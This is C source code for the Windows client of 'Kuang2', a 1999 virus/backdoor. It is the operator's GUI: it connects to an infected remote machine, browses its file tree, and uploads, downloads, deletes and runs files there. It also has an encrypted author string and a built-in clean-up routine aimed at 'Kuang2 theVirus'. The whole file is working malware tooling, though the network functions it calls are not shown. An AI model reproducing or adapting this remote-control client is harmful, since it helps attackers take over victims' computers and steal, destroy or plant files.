/***[ThuNderSoft]*************************************************************
								 KUANG2: client
								   ver: 0.21
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

/* HISTORY */
// >>>>> RELEASE VERSION: 0.21 (26-may-1999) <<<<<
// ver 0.21 (26-may-1999): mali bug u virusu
// >>>>> RELEASE VERSION: 0.20 (22-may-1999) <<<<<
// ver 0.20 (10-may-1999): puno sreîivanja
// ver 0.10 (02-apr-1999): born code

#include <windows.h>
#include <commctrl.h>
#include <win95e.h>
#include <tools.h>
#include <strmem.h>
#include "k2c.h"

#pragma aux Wmain "_*"

HWND hThisInst;
HANDLE hThread;
DWORD ThreadID;
HWND hDlg;
extern HWND hsmall, hsmallist;

HWND hTV;
TV_ITEM tvItem;
TV_ITEM tvRecvItem;
TV_INSERTSTRUCT tvInsert;
HTREEITEM hthisone, hright;
NM_TREEVIEW FAR *nmt;
BOOL connected, DLGOK;

extern LRESULT CALLBACK small_MsgLoop(HWND, UINT, WPARAM, LPARAM);
extern char buffer[BUFFER_SIZE];
extern pMessage k2_msg;
char path[MAX_PATH];

HICON hIcon1, hIcon2, hIcon3, hIcon4, ikona;
HIMAGELIST hIlist;
int iDoc;
int iSystem;
int iFolder;
int iFolderX;

unsigned int _code, i;
RECT r;
BOOL minimised, max_pa_min;

// Externe f-je, threadovi
extern DWORD WINAPI Aconnect(LPVOID);
extern DWORD WINAPI Aquit(LPVOID);
extern DWORD WINAPI Adownload(LPVOID);
extern DWORD WINAPI Aupload(LPVOID);
extern DWORD WINAPI Adirlist(LPVOID);
extern DWORD WINAPI Adelete(LPVOID);
extern DWORD WINAPI Arun(LPVOID);
extern DWORD WINAPI CleanSystem(LPVOID);

extern char str_connected[];
#define SayStatus(s) SendDlgItemMessage(hDlg, ID_STATUS, WM_SETTEXT, 0, (LPARAM) s)

//char eporuka[]=" v1.0   by Weird  <weird173@yahoo.com>";
char eporuka[]={
	0x65, 0xFB, 0xF5, 0x69, 0xF0, 0xFC, 0x95, 0xEA, 0xC3, 0xAE, 0x1F, 0x8D,\
	0x40, 0x68, 0xF7, 0x16, 0x53, 0x53, 0x2E, 0x80, 0x93, 0x7F, 0xE2, 0x3E,\
	0xEF, 0x6A, 0x6B, 0x0F, 0x69, 0x5B, 0xCD, 0x4E, 0x0C, 0x1D, 0xD9, 0x1B,\
	0x4B, 0x26, 0x2A, 0xAC, 0x94, 0x05, 0xF2, 0xA9, 0x85, 0x79, 0x5B, 0x5A};

char ffiltar[]="All types (*.*)\00*.*\00";
char fajl[MAX_PATH];
char temp[MAX_PATH];
char ftitle[]="Upload: local file";
char coded[]="Coded";


OPENFILENAME ofn = {
	sizeof(OPENFILENAME),		// veliÅina ove strukture
	NULL,						// vlasnik (kasnije)
	NULL,
	ffiltar,					// filter linija
	NULL, NULL,					// custom filtars
	1,
	fajl,						// REZULTAT
	MAX_PATH,					// max slova za fajl
	temp, MAX_PATH,
	NULL,						// inicijalni direktorijum
	ftitle,						// Title za Open dijalog
	OFN_FILEMUSTEXIST | OFN_HIDEREADONLY,		// flagovi
	0,							// fajl ofset
	0,							// fajl extenzija ofset
	NULL,						// default extenzija
	0,0,0};



/*
	dajceloime
	----------
  ˛ daje celo ime tree-view itema u buffer+4
  ˛ Åisti string za ime fajla - sklanja veliÅinu fajla */

void dajceloime(HTREEITEM hti)
{
	char *buf=&buffer[4];
	*buf=0;

	while (hti) {
		tvRecvItem.hItem=hti;							// ovo je sada trenutni
		tvRecvItem.mask = TVIF_HANDLE | TVIF_TEXT;		// uzmi ime
		tvRecvItem.pszText = temp;						// buffer za ime
		tvRecvItem.cchTextMax = MAX_PATH;
		TreeView_GetItem(hTV, &tvRecvItem);				// preuzmi
		straddcF(temp, '\\');
		straddF(temp, buf);
		strcopyF(buf, temp);
		hti=TreeView_GetParent(hTV, hti);				// dalje gore
	}
	return;
}


/*
	Uploadloop
	----------
  ˛ Obrada poruka za pomoÜni dijalog. */

LRESULT CALLBACK Uploadloop (HWND hd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
		case WM_INITDIALOG:
			SendDlgItemMessage(hd, ID_EDIT_U, EM_SETLIMITTEXT, MAX_PATH, 0);
			dajceloime(TreeView_GetSelection(hTV));
			i=4; while ((buffer[i]) && (buffer[i]!='<')) {
				if (buffer[i]=='\\') _code=i;
				i++;
			}
			if (buffer[i]=='<') buffer[_code+1]=0;  // ako je selektovan fajl preuzmi njegov folder
			SendDlgItemMessage(hd, ID_EDIT_U, WM_SETTEXT, 0, (LPARAM) &buffer[4]);
			break;

		case WM_SYSCOMMAND:
			if (wParam == SC_CLOSE) {
				DLGOK=FALSE;
				EndDialog(hd, TRUE);
				return TRUE; }
			break;

		case WM_COMMAND:
			if (HIWORD(wParam)==BN_CLICKED) {
				if (LOWORD(wParam) == ID_BUTTON_U ) {
					SendDlgItemMessage(hd, ID_EDIT_U, WM_GETTEXT, MAX_PATH, (LPARAM) k2_msg->bdata);
					i=strlengthF(&buffer[4]);
					if (buffer[3+i]!='\\') {
						buffer[4+i]='\\'; buffer[5+i]=0;
					}
					DLGOK=TRUE;
					EndDialog(hd, TRUE);
					return TRUE;
				}
			}
			break;
	}
	return FALSE;
}

/*
	Runloop
	--------
  ˛ Obrada poruka za pomoÜni dijalog.
  ˛ Ako je izabrano startovanje fajla onda je DLGOK==TRUE; u suprotnom DLGOK==FALSE */

LRESULT CALLBACK Runloop (HWND hd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
		case WM_INITDIALOG:
			SendDlgItemMessage(hd, ID_EDIT_R, EM_SETLIMITTEXT, MAX_PATH, 0);
			SendDlgItemMessage(hDlg, ID_ENAME, WM_GETTEXT, MAX_PATH, (LPARAM) temp);
			SendDlgItemMessage(hd, ID_EDIT_R, WM_SETTEXT, 0, (LPARAM) temp);
			break;

		case WM_SYSCOMMAND:
			if (wParam == SC_CLOSE) {
				DLGOK=FALSE;
				EndDialog(hd, TRUE);
				return TRUE; }
			break;

		case WM_COMMAND:
			if (HIWORD(wParam)==BN_CLICKED) {
				if (LOWORD(wParam) == ID_BUTTON_R ) {
					SendDlgItemMessage(hd, ID_EDIT_R, WM_GETTEXT, MAX_PATH, (LPARAM) k2_msg->bdata);
					DLGOK=TRUE;
					EndDialog(hd, TRUE);
					return TRUE;
				}
			}
			break;
	}
	return FALSE;
}


/*
	EnableButts
	-----------
  ˛ enable/disable dumiÜa */

void EnableButts(BOOL cond) {
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON_UP), cond);
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON_DOWN), cond);
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON_DEL), cond);
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON_RUN), cond);
	EnableWindow(GetDlgItem(hDlg, ID_TV), cond);
	EnableWindow(GetDlgItem(hDlg, ID_ENAME), cond);
	if (cond) SetFocus(hTV);
	EnableWindow(GetDlgItem(hDlg, ID_BUTTON_CLEAN), !connected);
	return;
}


/*
	OnTreeView_Rbutton
	------------------
  ˛ otpuÑtanje desnog dugmeta miÑa - radi PopUp meni u treeView kontroli. */

void OnTreeView_Rbutton(HWND hwnd)
{
	RECT  rc;
	POINT pt;
	HMENU hmenu;
	HMENU hmenuTrackPopup;
	TV_ITEM tvitem;
	TV_HITTESTINFO hittest;

	if (!connected) return;					// ako nismo konektovani, izaîi

	GetWindowRect(hTV, &rc);				// uzmi koordinate treeView-a
	GetCursorPos(&pt);						// uzmi koordinate kurzora

	if (!PtInRect(&rc, pt)) return;			// ako nije u prozoru, izaîi

	hittest.pt.x=pt.x-rc.left;				// ok, klik je u treeview prozoru
	hittest.pt.y=pt.y-rc.top;				// preîi na client koordinate klika

	tvitem.mask=TVIF_PARAM | TVIF_HANDLE;
	hright=TreeView_HitTest(hTV, &hittest); // preuzmi kliknuti item
	if (hright==NULL) return;
	tvitem.hItem=hright;
	TreeView_GetItem(hTV, &tvitem);			// preuzmi osobine kliknutog itema

	switch (tvitem.lParam) {
		case 0:
			hmenu=LoadMenu(hThisInst, "POPUP_FILE");        // ako je kliknuto na fajl
			break;
		case 1:
			hmenu=LoadMenu(hThisInst, "POPUP_UFOLDER");     // ako je kliknuto na folder
			break;
		case 2:
			hmenu=LoadMenu(hThisInst, "POPUP_FOLDER");      // ako je kliknuto na folder
			break;
		default:
			return;
	}
	if (!hmenu) return;

	hmenuTrackPopup=GetSubMenu(hmenu, 0);

	TrackPopupMenuEx(hmenuTrackPopup,		// nacrtaj i 'radi' PopUp meni
		TPM_LEFTALIGN | TPM_TOPALIGN | TPM_LEFTBUTTON | TPM_HORIZONTAL | TPM_RIGHTBUTTON,
		pt.x, pt.y,
		hwnd,
		NULL);

	DestroyMenu(hmenu);						// na kraju obriÑi meni
	return;
}


/*
	preuzmi
	-------
  ˛ pomoÜna funkcja, sreîuje string kada ga meni izabere */

void preuzmi(void)
{
	char *buf=&buffer[4];
	dajceloime(hright);
	i=0; while (buf[i]!='<') i++;
	buf[i-1]=0;
	SendDlgItemMessage(hDlg, ID_ENAME, WM_SETTEXT, 0, (LPARAM)k2_msg->bdata);
	return;
}


/*
	UnseeIt
	-------
  ˛ pomoÜna funkcja, izabrani folder nameÑta na unseen.
  ˛ u 'hright' je HTREEITEM foldera. */

void UnseeIt(void)
{
	TV_ITEM ti;

	// zatvori item i obriÑi sve childove
	TreeView_Expand(hTV, hright, TVE_COLLAPSE | TVE_COLLAPSERESET);

	// pa onda setuj sve Ñto treba
	ti.hItem=hright;
	ti.mask= TVIF_PARAM | TVIF_IMAGE | TVIF_SELECTEDIMAGE;
	ti.lParam=1;							// nije otvoren
	ti.iSelectedImage=ti.iImage=iFolderX;	// i odgovarajuÜa ikona
	TreeView_SetItem(hTV, &ti);

	return;
}


/*
	SetDlg
	------
  ˛ pomoÜna funkcja, kada se menja veliÅina dijaloga sreîuje pomerljive
	komponente. */

void SetDlg(RECT rect)
{
	unsigned int w,h;
	w = (rect.right - rect.left)-8;			// oslobodi se desnog i levog bordera
	h = (rect.bottom - rect.top)-138-24;
	MoveWindow(hTV, 0, 78, w, h, TRUE);
	MoveWindow(GetDlgItem(hDlg, ID_ENAME), 6, 78+h+6, w-13, 20, TRUE);
	MoveWindow(GetDlgItem(hDlg, ID_BUTTON_UP),	 6, 78+h+32, 54, 20, TRUE);
	MoveWindow(GetDlgItem(hDlg, ID_BUTTON_DOWN), 66, 78+h+32, 54, 20, TRUE);
	MoveWindow(GetDlgItem(hDlg, ID_BUTTON_DEL), 126, 78+h+32, 54, 20, TRUE);
	MoveWindow(GetDlgItem(hDlg, ID_BUTTON_RUN), 186, 78+h+32, 54, 20, TRUE);
	return;
}

/*
	Kmsgloop
	--------
  ˛ Obrada poruka za dijalog. */

LRESULT CALLBACK Kmsgloop (HWND hd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {

		case WM_INITDIALOG: // inicijalizacija dialoga PRE nego Ñto se dijalog otvori
			hDlg=hd;
			SendDlgItemMessage(hDlg, ID_EDIT, EM_SETLIMITTEXT, 15, 0);		// ograniÅi za svaki sluÅaj
			hTV=GetDlgItem(hDlg, ID_TV);	// uzmi handle od Tree-View-a
			TreeView_SetIndent(hTV, 8);		// odreîuje ident od 8 pixela
			tvInsert.hInsertAfter = TVI_LAST;
			tvItem.mask = TVIF_TEXT | TVIF_CHILDREN | TVIF_PARAM | TVIF_IMAGE | TVIF_SELECTEDIMAGE;
			tvItem.lParam=0;
			hIcon1=LoadIcon(hThisInst, "DOC");              // uÅitaj ikone
			hIcon2=LoadIcon(hThisInst, "FOLDER");
			hIcon3=LoadIcon(hThisInst, "SYSTEM");
			hIcon4=LoadIcon(hThisInst, "FOLDERX");
			hIlist=ImageList_Create(16, 16, TRUE, 1, 0);	// kreiraj image list
			iDoc=ImageList_AddIcon(hIlist, hIcon1);			// dodaj ikone u image list
			iFolder=ImageList_AddIcon(hIlist, hIcon2);
			iSystem=ImageList_AddIcon(hIlist, hIcon3);
			iFolderX=ImageList_AddIcon(hIlist, hIcon4);
			TreeView_SetImageList(hTV, hIlist, TVSIL_NORMAL);// poveÇi image list sa tree view
			ikona=LoadIcon(hThisInst, "AAA");                           // uÅitaj ikonu programa
			SendMessage(hDlg, WM_SETICON, ICON_BIG, (LPARAM) ikona);	// setuj ikonu za program
			SendMessage(hDlg, WM_SETICON, ICON_SMALL, (LPARAM) ikona);	// setuj ikonu za program
			rdecrypt(eporuka, eporuka);						// dekriptuj eporuku
			for (i=0; i<5; i++) eporuka[i+1]=coded[i];		// dodaj reÅ 'coded'
			SetDlgItemText(hDlg, ID_STATUS, &eporuka[1]);	// ispiÑi poruku u statusu
			max_pa_min=minimised=FALSE;
			connected=FALSE;
			EnableButts(FALSE);
			return TRUE;			// WM_INITDIALOG mora da vrati TRUE

		case WM_GETMINMAXINFO: {	// zahteva se informacija o min/max dimenzijama dijaloga
			MINMAXINFO *lpMMI = (MINMAXINFO *)lParam;
			lpMMI->ptMinTrackSize.x=263;		// minimalna Ñirina
			lpMMI->ptMinTrackSize.y=220;		// minimalna visina
			GetWindowRect(hd, &r);
			lpMMI->ptMaxSize.x=r.right-r.left;	// nepromenljiva Ñirina
			lpMMI->ptMaxPosition.x=r.left;		// nepromenljiva x koordinate
			return 0;		// vraÜa se 0 ako je ova poruka obraîena
			}

		case WM_SIZING:		// pomeranje u toku...
			SetDlg(* (LPRECT)lParam);
			return TRUE;

		case WM_SIZE:		// pomeranje je zavrÑeno ili je uraîen min/max/restore
			GetWindowRect(hd, &r);
			SetDlg(r);
			InvalidateRect(hDlg, NULL, FALSE);	// osveÇi prozor
			return TRUE;

		case WM_SYSCOMMAND:
			if (wParam == SC_CLOSE) {		// pritisnuto 'x' dugme za kraj
				DestroyIcon(ikona);
				ImageList_Destroy(hIlist);
				DestroyIcon(hIcon4);
				DestroyIcon(hIcon3);
				DestroyIcon(hIcon2);
				DestroyIcon(hIcon1);
				EndDialog(hDlg, TRUE);		// zatvori dijalog
				return TRUE; }
			if (wParam==SC_MINIMIZE) {		// pre minimizacije
				minimised=TRUE;				// zapamti da Üe biti minimizovan
				max_pa_min=IsZoomed(hDlg);	// zapamt da li je pre toga bio maximizovan
				break;
			}
			if (wParam==SC_RESTORE) {	// pre restore!
				OpenIcon(hDlg);
				if (max_pa_min) {
					max_pa_min=minimised=FALSE;		// nije viÑe minimizovan
					ShowWindow(hDlg, SW_MAXIMIZE);	// pa onda maximizacija!
					return TRUE;
				}
				break;
			}
			if (wParam==SC_MAXIMIZE) {	// pre max!
				if (minimised) {
					minimised=FALSE;
					OpenIcon(hDlg);
					ShowWindow(hDlg, SW_MAXIMIZE);	// pa onda maximizacija!
				}
				break;
			}
			break;

		case UM_ASYNCEND:						// obaveÑtavanje glavnog programa
			if ((wParam==173)&&(lParam==173)) { // da je asinhrona komanda zavrÑena
				EnableButts(connected);
				CloseHandle(hThread);
				return TRUE;
			}
			break;

		case WM_COMMAND:
			/* POPUP MENU */
			switch (wParam) {
				case IDM_DOWNLOAD:
					preuzmi();
					wParam=MAKEWPARAM(ID_BUTTON_DOWN, BN_CLICKED);
					break;
				case IDM_DELETE:
					preuzmi();
					wParam=MAKEWPARAM(ID_BUTTON_DEL, BN_CLICKED);
					break;
				case IDM_RUN:
					preuzmi();
					wParam=MAKEWPARAM(ID_BUTTON_RUN, BN_CLICKED);
					break;
				case IDM_EXPAND:
					dajceloime(hright);
					TreeView_Expand(hTV, hright, TVE_TOGGLE);
					hright=NULL;
					break;
				case IDM_UNSEEN:
					UnseeIt();
					break;
			}
			/* BUTTON */
			if (HIWORD(wParam)==BN_CLICKED) {
				switch (LOWORD(wParam)) {
					case ID_BUTTON:
						EnableButts(FALSE);
						EnableWindow(GetDlgItem(hDlg, ID_BUTTON_CLEAN), FALSE);
						if (!connected) hThread=CreateThread(NULL, 0, Aconnect, NULL, 0, &ThreadID);
							else hThread=CreateThread(NULL, 0, Aquit, NULL, 0, &ThreadID);
						break;

					case ID_BUTTON_DOWN:
						// prvo preuzmi ime za download
						if (!SendDlgItemMessage(hDlg, ID_ENAME, WM_GETTEXT, BUFFER_SIZE-4, (LPARAM)k2_msg->bdata)) {
							SayStatus("Error: no file name.");
							break;
						}
						EnableButts(FALSE);
						hThread=CreateThread(NULL, 0, Adownload, NULL, 0, &ThreadID);
						break;

					case ID_BUTTON_UP:
						// prvo preuzmi lokalno ime za upload u 'fajl'
						fajl[0]=0;	// ovo mora zbog buga kod GetOpenFileName
						if (!GetOpenFileName(&ofn)) break;
						// a zatim i remote putanju gde ga treba smestiti
						DialogBox(hThisInst,"UPLOAD_DIALOG", hDlg, (DLGPROC) Uploadloop);
						if (DLGOK==FALSE) break;
						EnableButts(FALSE);
						hThread=CreateThread(NULL, 0, Aupload, NULL, 0, &ThreadID);
						break;

					case ID_BUTTON_DEL:
						if (!SendDlgItemMessage(hDlg, ID_ENAME, WM_GETTEXT, BUFFER_SIZE-4, (LPARAM) k2_msg->bdata)) {
							SayStatus("Error: no file name.");
							break;
						}
						if (MessageBox(hDlg, "Delete remote file?", "Confirmation", MB_SYSTEMMODAL | MB_YESNO | MB_ICONWARNING) == IDYES) {
							EnableButts(FALSE);
							hThread=CreateThread(NULL, 0, Adelete, NULL, 0, &ThreadID);
						}
						break;

					case ID_BUTTON_RUN:
						DialogBox(hThisInst,"RUN_DIALOG", hDlg, (DLGPROC) Runloop);
						if (DLGOK==FALSE) break;
						EnableButts(FALSE);
						hThread=CreateThread(NULL, 0, Arun, NULL, 0, &ThreadID);
						break;

					case ID_BUTTON_CLEAN:
						i=MessageBox(hDlg, "Please, read this before anti-virus starts:\r\n\r\n1) Kuang2 theVirus *must not* be active!\r\n2) All programs should be closed\r\n     before you run the anti-virus.\r\n\r\nDo you wish to continue?", "Kuang2 Anti-Virus", MB_YESNO | MB_ICONWARNING);
						if (i==IDNO) break;
						hsmall=CreateDialog(hThisInst, "SMALL_DIALOG", hDlg, small_MsgLoop);
						hThread=CreateThread(NULL, 0, CleanSystem, NULL, 0, &ThreadID);
						break;
				}
				return TRUE;
			}
			break;

		case WM_NOTIFY:
			_code=((LPNMHDR)lParam)->code;
			// otvaranje foldera
			if (_code==TVN_ITEMEXPANDING) {
				nmt=(NM_TREEVIEW FAR*) lParam;
				if ((nmt->itemNew).lParam==2) break;
				EnableButts(FALSE);
				// folder se otvara po prvi put
				hthisone=(nmt->itemNew).hItem;		// zapamti
				dajceloime(hthisone);				// uzmi celo ime u baffer+4
				straddF(&buffer[4], "*.*");         // dodaj extenzije
				hThread=CreateThread(NULL, 0, Adirlist, NULL, 0, &ThreadID);
				return TRUE;
			}
			// promenjen je trenutno selektovan element
			if (_code==TVN_SELCHANGED) {
				SayStatus(str_connected);
				nmt=(NM_TREEVIEW FAR*) lParam;
				if ((nmt->itemNew).lParam==0) {
					dajceloime((nmt->itemNew).hItem);
					strcopyF(temp,k2_msg->bdata);
					i=0; while (temp[i]!='<') i++;
					temp[i-1]=0;
					SendDlgItemMessage(hDlg, ID_ENAME, WM_SETTEXT, 0, (LPARAM) temp);
				}
				return TRUE;
			}
			// kliknuto je desno dugme na neki element
			if (_code==NM_RCLICK) {
				OnTreeView_Rbutton(hd);
				return TRUE;
			}
			break;
	}

	return FALSE;
}

/*
	Wmain
	-----
  ˛ Startuje */

int Wmain(void)
{
	char *CmdLine;
	WSADATA W;

	hThisInst=(HWND) GetModuleHandle(NULL);
	CmdLine=GetCommandLine();
	GetStripCmdline(path, CmdLine);			// preuzmi putanju

	if (WSAStartup (0x101, &W)) return 1;	// zahteva se winsock v1.1
	InitCommonControls();					// za tree-view
	DialogBox (hThisInst,"KUANG_DIALOG", NULL, (DLGPROC) Kmsgloop);
	WSACleanup();
	return 0;
}
